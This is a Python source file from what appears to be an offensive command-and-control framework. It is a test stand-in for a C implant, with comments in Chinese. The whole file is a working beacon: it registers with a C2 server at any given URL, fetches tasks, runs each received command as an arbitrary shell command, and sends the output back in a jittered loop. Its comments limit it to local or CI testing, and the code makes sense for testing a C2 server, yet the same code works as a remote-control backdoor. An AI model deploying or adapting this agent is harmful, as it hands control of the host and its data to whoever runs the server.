"""Python 模拟 beacon：协议正确的植入体替身，用于 E2E 与 CI。

行为：注册 → 领任务 → 执行（本地 subprocess）→ 回传结果，循环直至 stop 事件。
真实 C 植入体（implant/beacon.c）实现同一协议，二者可互换对拍。

⚠ 仅用于本机/CI 联调：任务执行走 shell=True（模拟真实植入体的 shell 语义），
  会把 C2 下发的任意命令当 shell 执行。不要部署到生产或对外可达环境；
  生产植入体是 C 版（implant/），没有这层通用 shell 执行面。
"""

from __future__ import annotations

import json
import os
import random
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from pathlib import Path

_VENDOR = Path(__file__).resolve().parent.parent.parent / "vendor"
if _VENDOR.is_dir() and not os.environ.get("CAMTY_NO_VENDOR"):
    sys.path.insert(0, str(_VENDOR))

sys.path.insert(0, str(Path(__file__).parent))
import protocol


class FakeBeacon:
    def __init__(self, server_url: str, psk: bytes, beacon_id: str | None = None,
                 host: str = "TESTBOX", user: str = "corp\\tester", sleep: float = 0.3):
        self.base = server_url.rstrip("/")
        self.psk = psk
        self.id = beacon_id or f"{host}-{random.randint(1000, 9999)}"
        self.info = {"id": self.id, "host": host, "user": user, "arch": "x64",
                     "sleep": sleep, "os": sys.platform}
        self.stop = threading.Event()
        self.executed: list[str] = []

    def _post(self, path: str, payload: dict) -> dict:
        from urllib.parse import urlparse
        from urllib.request import ProxyHandler, build_opener

        body = protocol.seal(self.psk, json.dumps(payload, ensure_ascii=False).encode("utf-8"))
        req = urllib.request.Request(
            self.base + path, data=body,
            headers={"Content-Type": "application/octet-stream"},
        )
        host = (urlparse(self.base).hostname or "").lower()
        if host in ("127.0.0.1", "localhost", "::1"):
            opener = build_opener(ProxyHandler({}))  # 回环绕过系统代理
            resp_ctx = opener.open(req, timeout=30)
        else:
            resp_ctx = urllib.request.urlopen(req, timeout=30)
        with resp_ctx as resp:
            return json.loads(protocol.open(self.psk, resp.read()).decode("utf-8"))

    def run_once(self) -> None:
        resp = self._post("/beacon", self.info)
        results = []
        for task in resp.get("tasks", []):
            if task.get("type") != "cmd":
                continue
            command = task.get("args", {}).get("command", "")
            self.executed.append(command)
            try:
                # ⚠ shell=True 是测试替身语义（模拟真实植入体 shell），仅限本机/CI；勿对外部署
                proc = subprocess.run(
                    command, shell=True, capture_output=True, text=True,
                    encoding="utf-8", errors="replace", timeout=60,
                )
                output, exit_code = (proc.stdout or "") + (proc.stderr or ""), proc.returncode
            except subprocess.TimeoutExpired:
                output, exit_code = "(timeout)", -1
            results.append({"task_id": task["id"], "output": output, "exit": exit_code})
        if results:
            self._post("/result", {"results": results})

    def serve(self) -> None:
        while not self.stop.is_set():
            try:
                self.run_once()
            except OSError:
                pass  # 服务端未起/重启，按 sleep 节奏重试
            self.stop.wait(self.info["sleep"] * random.uniform(0.8, 1.2))

    def start(self) -> None:
        thread = threading.Thread(target=self.serve, daemon=True)
        thread.start()
        return thread


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(prog="fake-beacon", description="协议正确的模拟植入体")
    parser.add_argument("--url", required=True, help="如 http://127.0.0.1:8800")
    parser.add_argument("--psk", required=True, help="32 字节 hex PSK")
    parser.add_argument("--id", default=None)
    parser.add_argument("--sleep", type=float, default=1.0)
    args = parser.parse_args()
    beacon = FakeBeacon(args.url, bytes.fromhex(args.psk), beacon_id=args.id, sleep=args.sleep)
    print(f"beacon {beacon.id} 运行中，Ctrl+C 停止")
    try:
        beacon.serve()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
